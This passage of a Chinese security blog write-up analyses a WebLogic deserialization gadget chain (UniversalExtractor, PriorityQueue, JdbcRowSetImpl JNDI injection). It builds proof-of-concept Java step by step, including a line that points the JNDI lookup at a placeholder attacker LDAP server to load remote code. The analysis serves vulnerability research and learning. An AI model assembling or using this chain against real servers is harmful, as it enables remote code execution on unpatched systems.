`VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES`数组中的前缀开头，是的话就会截取掉并返回。
回到`extractComplex`方法中，在if条件里会对上述返回的方法名做首字母大写处理，然后拼接`BEAN_ACCESSOR_PREFIXES`数组中的前缀，判断`clzTarget`类中是否含有拼接后的方法。这时发现无论如何我们都只能调用任意类中`get`和`is`开头的方法，并且还要是无参的。
整理下我们可以利用的思路：
  * 调用`init()`方法，对`this.method`进行赋值，从而使`fProperty`的值为`false`，从而进入else分支语句，实现调用任意类的任意方法。然而这个思路马上就被终结了，因为我们根本调用不了非`get`和`is`开头的方法！！！
  * 被`transient`修饰的`m_cacheTarget`在`extractComplex`方法中被赋值
在`ExtractorComparator.compare()`方法中，我们知道`extract`方法能被执行两次，因此在第二次执行时，能够在`UniversalExtractor.extract`方法中调用`targetPrev.getMethod().invoke(oTarget,
this.m_aoParam)`方法。但是这种方法也是行不通的，因为`getMethod()`获取的就是图上红框的中的`method`，很显然`method`依旧受到限制，当我们调用非
`get` 和 `is` 开头的方法时，`findMethod` 会返回 `null`。
  * 只能走方法被限制的路线了，寻找所有类中以 `get` 和 `is` 开头并且可利用的无参方法
复现过Fastjson反序列化漏洞的小伙伴，应该清楚Fastjson的利用链寻找主要针对`get`和`set`方法，这时候就与我们的需求有重合处，不难想到`JdbcRowSetImpl`的JNDI注入，接下来一起回顾一下。
其`connect`方法中调用了`lookup`方法，并且`DataSourceName`是可控的，因此存在JNDI注入漏洞，看看有哪些地方调用了`connect`方法。
有三个方法调用了`connect`方法，分别为`prepare`、`getDatabaseMetaData`和`setAutoCommit`方法，逐一分析。
  * **prepare()**
一开始就调用了`connect`方法，继续回溯哪里调用了`prepare`方法。
`execute`方法，应该是用于执行sql查询的
这个应该是用于获取参数元数据的方法，`prepare()`方法应该都是用于一些与sql语句有关的操作方法中。
  * **getDatabaseMetaData()**
  * **setAutoCommit()**
必须让`this.conn`为空，对象初始化时默认为`null`，因此直接进入else语句。其实`this.conn`就是`connect`方法，用于保持数据库连接状态。
回到`connect`方法，我们需要进入else语句才能执行`lookup`方法。有两个前提条件，`this.conn`为空，也就是执行`connect`方法时是第一次执行。第二个条件是必须设置`DataSourceName`的值，跟进去该参数，发现为父类`BaseRowSet`的`private`属性，可被反序列化。
那么，对于WebLogic这个反序列化利用链，我们只要利用`getDatabaseMetaData()`方法就行，接下来看看该怎么一步步构造poc。先从`JdbcRowSetImpl`的JNDI注入回溯构造：
    JdbcRowSetImpl jdbcRowSet = (JdbcRowSetImpl)JdbcRowSetImpl.class.newInstance();
    Method setDataSource_Method = jdbcRowSet.getClass().getMethod("setDataSourceName", String.class);
    setDataSource_Method.invoke(jdbcRowSet,"ldap://xx.xx.xx.xx:1389/#Poc");//地址自行构造
    //利用ysoserial的Reflections模块,由于需要获取queue[i]进行compare，因此需要对数组进行赋值
    Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
    queueArray[0] = jdbcRowSet;
    queueArray[1] = jdbcRowSet;
接着构造`UniversalExtract`对象，用于调用`JdbcRowSetImpl`对象的方法
    UniversalExtractor universalExtractor = new UniversalExtractor();
    Object object = new Object[]{};
    Reflections.setFieldValue(universalExtractor,"m_aoParam",object);
    Reflections.setFieldValue(universalExtractor,"m_sName","DatabaseMetaData");
    Reflections.setFieldValue(universalExtractor,"m_fMethod",false);
紧接着将`UniversalExtract`对象装载进文章开头构造的`chainedExtractor`对象中
    ValueExtractor[] valueExtractor_list = new ValueExtractor[]{ universalExtractor };
    field.set(chainedExtractor,valueExtractor_list2);//field为m_aExtractor
此处，还有一个小点需注意，一个在文章开头部分构造的`PriorityQueue`对象，需要构造一个临时`Extractor`对象，用于创建时的`comparator`，此处以`ReflectionExtractor`为例。其次，`PriorityQueue`对象需要执行两次`add`方法。
    ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString",new Object[]{});
    ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{reflectionExtractor});
    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
    queue.add("1");
    queue.add("1");
回到`PriorityQueue`对象的`readObject`方法
首先需要能进入for循环，for循环就得有`size`的值，`size`值默认为0，private属性，可以通过反射直接设置，但是不想通过反射怎么办，回溯赋值过程。
在`offer`方法处获得赋值，而`offer`方法又是由`add`方法调用。（注意此处会执行`siftUp`方法，其中会触发comparator的`compare`方法，从而执行`extract`方法）。
不难理解，每`add`一次，`size`加1，根据上述`heapify`方法，只会从开头开始取一半的`queue`数组执行`siftDown`方法。所以`size`至少为2，需要执行两次`add`方法，而不是`add(2)`一次。
至此，poc的主体就构造完成，其余部分就不在此阐述了，当然构造方式有很多，此处为方便萌新，分析得比较啰嗦，poc也比较杂乱，大家可以自行构造属于自己的poc。如果想要了解简洁高效的poc，可以参考一下Y4er师傅的poc[3]。
## 体会
初次接触完整的反序列化漏洞分析，在整个分析过程中收获到很多东西。笔者得到的不仅仅只是知识上的收获，在调试过程中也学到了很多调试技巧。另外本文看起来可能会比较啰嗦冗余，但其初衷是想要站在读者的角度去思考，去为了方便一些同样刚入门的人阅读起来，能够更加浅显易懂。学安全，我们经常会碰壁，对于一些知识会比较难啃。有些人遇到就选择了放弃，然后却因此原地踏步。不妨就这样迎难而上，咬着牙啃下去，到最后，你会发现，你得到的，远远比你付出的要多。可能对部分人不太有效、毕竟因人而异，但这是自己在学习过程中所体会到的，也因此想要分享给大家这么一个建议。相信在未来，自己对于反序列化漏洞的理解以及挖掘思路，能够有更深刻的认知，同时激发出自己不一样的思维碰撞。
## References
[1] Oracle 7月安全更新
[2] T3反序列化 Weblogic12.2.1.4.0 JNDI注入
[3] Y4er的poc
[4] Java反序列化：基于CommonsCollections4的Gadget分析
[5] Oracle WebLogic 最新补丁的绕过漏洞分析（CVE-2020-2883）
* * *